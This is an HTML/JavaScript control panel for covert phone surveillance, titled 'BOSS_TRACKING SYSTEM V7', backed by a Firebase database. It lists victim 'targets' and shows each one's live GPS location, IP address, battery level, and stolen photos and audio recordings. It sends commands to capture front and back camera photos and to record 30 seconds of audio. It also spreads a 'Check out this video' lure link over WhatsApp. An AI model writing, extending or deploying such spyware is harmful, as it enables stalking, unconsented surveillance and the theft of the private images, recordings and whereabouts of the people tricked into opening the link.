<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BOSS_TRACKING SYSTEM V7</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --panel: #0d0d0d; --red: #ff3131; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar Styles */
        .sidebar { width: 280px; border-right: 1px solid #222; background: #000; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; border-bottom: 1px solid #222; text-align: center; background: #0a0a0a; }
        .node-list { flex: 1; overflow-y: auto; padding: 10px; }
        .node-item { border: 1px solid #222; padding: 15px; margin-bottom: 10px; cursor: pointer; position: relative; transition: 0.3s; }
        .node-item:hover { border-color: var(--neon); background: rgba(0, 255, 65, 0.05); }
        .node-item.active { border-color: var(--neon); background: rgba(0, 255, 65, 0.1); box-shadow: inset 0 0 10px rgba(0,255,65,0.2); }
        
        /* Status Indicators */
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 8px; background: #444; }
        .online { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
        .live-tag { font-size: 9px; color: var(--neon); font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        /* Custom Red Text */
        .protocol-red { color: var(--red) !important; font-weight: bold; text-shadow: 0 0 5px var(--red); }

        /* Main Content */
        .main-content { flex: 1; display: flex; flex-direction: column; background: var(--bg); position: relative; }
        .header-bar { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
        
        /* Control Buttons */
        .controls { padding: 20px; display: flex; flex-wrap: wrap; gap: 10px; background: #0a0a0a; border-bottom: 1px solid #222; }
        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 10px 18px; cursor: pointer; font-family: inherit; font-weight: bold; font-size: 12px; transition: 0.2s; }
        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        .btn-red { border-color: var(--red); color: var(--red); }
        .btn-red:hover { background: var(--red); color: #fff; box-shadow: 0 0 15px var(--red); }

        /* Dashboard Grid */
        .grid { display: grid; grid-template-columns: 1fr 1.5fr; gap: 20px; padding: 20px; overflow-y: auto; }
        .box { background: var(--panel); border: 1px solid #222; padding: 15px; position: relative; }
        .box h3 { margin-top: 0; font-size: 14px; border-bottom: 1px solid #222; padding-bottom: 10px; color: #aaa; }

        .feed { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
        .media-card { background: #000; border: 1px solid #222; padding: 5px; text-align: center; position: relative; }
        .media-card img { width: 100%; height: auto; border: 1px solid #111; }
        .card-actions { display: flex; justify-content: space-between; padding: 5px 2px; }
        .action-link { font-size: 10px; color: var(--neon); text-decoration: none; border: 1px solid #333; padding: 2px 5px; }
        .del-btn { color: var(--red); cursor: pointer; background: none; border: 1px solid #333; font-size: 10px; }

        .rename-container { display: flex; gap: 5px; }
        .name-input { background: #000; border: 1px solid #333; color: var(--neon); padding: 5px; width: 150px; }

        iframe { width: 100%; height: 250px; border: none; filter: invert(90%) hue-rotate(180deg) brightness(1.2); }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">
            <h2 style="margin:0; color:var(--neon); font-size:18px;">BOSS_V7 <span class="protocol-red" style="font-size:10px;">SRV_2285</span></h2>
            <small class="protocol-red">ZOMBIE_PROTOCOL_ACTIVE</small>
        </div>
        <div class="node-list" id="node-list"></div>
    </div>

    <div class="main-content" id="main-ui" style="display:none;">
        <div class="header-bar">
            <div class="rename-container">
                <input type="text" id="target-name-input" class="name-input">
                <button class="btn" style="padding:5px 10px;" onclick="saveCustomName()">RENAME</button>
            </div>
            <div id="status-info" style="font-size: 12px; color: #888;"></div>
        </div>

        <div class="controls">
            <button class="btn" onclick="sendCommand('photo')">üì∏ FRONT CAPTURE</button>
            <button class="btn" onclick="sendCommand('back_photo')">üì∏ BACK CAPTURE</button>
            <button class="btn" onclick="sendCommand('audio')">üéôÔ∏è RECORD AUDIO (30s)</button>
            <button class="btn" onclick="window.open('https://api.whatsapp.com/send?text=Check out this video: ' + location.href)">üîó SHARE LINK</button>
            <button class="btn btn-red" onclick="wipeTargetData()">üíÄ WIPE NODE DATA</button>
        </div>

        <div class="grid">
            <div class="box">
                <h3>üìç LIVE_LOCATION</h3>
                <div id="map-container">Waiting for GPS...</div>
                <div id="loc-data" style="font-size: 11px; margin-top: 10px;"></div>
            </div>
            <div class="box">
                <h3>‚öôÔ∏è SYSTEM_LOGS</h3>
                <div id="log-content" style="font-size: 12px; line-height: 1.6;"></div>
            </div>
            <div class="box" style="grid-column: span 2;">
                <h3>üìÅ INTEL_FEED (Photos & Audio)</h3>
                <div class="feed" id="intel-feed"></div>
            </div>
        </div>
    </div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedNode = null;

    // --- REAL-TIME NODE LIST SYNC ---
    db.ref('targets').on('value', snap => {
        const list = document.getElementById('node-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const id = child.key;
            const data = child.val();
            const displayName = data.customName || id;
            
            // Check online status based on presence of info or status
            const isOnline = data.info ? "online" : "";
            const isWatching = (data.info && data.info.status === "ONLINE") ? "<span class='live-tag'>[WATCHING_VIDEO]</span>" : "";
            
            list.innerHTML += `
                <div class="node-item ${selectedNode == id ? 'active' : ''}" onclick="selectNode('${id}')">
                    <span class="status-dot ${isOnline}"></span>
                    <strong>${displayName}</strong> ${isWatching}<br>
                    <small style="color:#555; font-size:10px;">${id}</small>
                </div>`;
        });
    });

    function selectNode(id) {
        selectedNode = id;
        document.getElementById('main-ui').style.display = 'flex';
        
        db.ref(`targets/${id}/customName`).once('value', s => {
            document.getElementById('target-name-input').value = s.val() || id;
        });

        db.ref(`targets/${id}/info`).on('value', s => {
            const info = s.val() || {};
            document.getElementById('log-content').innerHTML = `
                IP_ADDRESS: <span style="color:#fff;">${info.ip || '---'}</span><br>
                BATTERY: <span style="color:#fff;">${info.battery || '---'}</span><br>
                STATUS: <span style="color:#fff;">${info.status || 'OFFLINE'}</span><br>
                LAST_ACTIVITY: <span style="color:#fff;">${info.time || '---'}</span>
            `;
        });

        db.ref(`targets/${id}/location`).on('value', s => {
            const loc = s.val();
            if(loc) {
                const mapUrl = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
                document.getElementById('map-container').innerHTML = `<iframe src="${mapUrl}"></iframe>`;
                document.getElementById('loc-data').innerHTML = `COORDS: ${loc.lat.toFixed(4)}, ${loc.lng.toFixed(4)}`;
            }
        });

        db.ref(`targets/${id}`).on('value', s => {
            const data = s.val() || {};
            const feed = document.getElementById('intel-feed');
            feed.innerHTML = "";

            if(data.photos) {
                Object.keys(data.photos).reverse().forEach(pId => {
                    const photo = data.photos[pId];
                    feed.innerHTML += `
                        <div class="media-card">
                            <img src="${photo.img}">
                            <div class="card-actions">
                                <a href="${photo.img}" download="${pId}.jpg" class="action-link">DOWNLOAD</a>
                                <button class="del-btn" onclick="deleteItem('photos/${pId}')">X</button>
                            </div>
                            <small style="font-size:9px;">${photo.type}</small>
                        </div>`;
                });
            }

            if(data.audios) {
                Object.keys(data.audios).reverse().forEach(aId => {
                    const audio = data.audios[aId];
                    feed.innerHTML += `
                        <div class="media-card" style="padding:10px;">
                            <audio src="${audio.data}" controls style="width:100%; height:30px;"></audio>
                            <div class="card-actions">
                                <button class="del-btn" onclick="deleteItem('audios/${aId}')">DELETE</button>
                            </div>
                        </div>`;
                });
            }
        });
    }

    function sendCommand(action) {
        if(!selectedNode) return;
        db.ref(`commands/${selectedNode}`).set({ action: action, ts: Date.now() });
    }

    function saveCustomName() {
        const newName = document.getElementById('target-name-input').value;
        if(selectedNode) db.ref(`targets/${selectedNode}/customName`).set(newName);
    }

    function deleteItem(path) {
        if(confirm("Confirm Deletion?")) db.ref(`targets/${selectedNode}/${path}`).remove();
    }

    function wipeTargetData() {
        if(confirm("DANGER: This will wipe ALL data for this node. Continue?")) {
            db.ref(`targets/${selectedNode}`).remove();
            document.getElementById('main-ui').style.display = 'none';
        }
    }
</script>
</body>
</html>
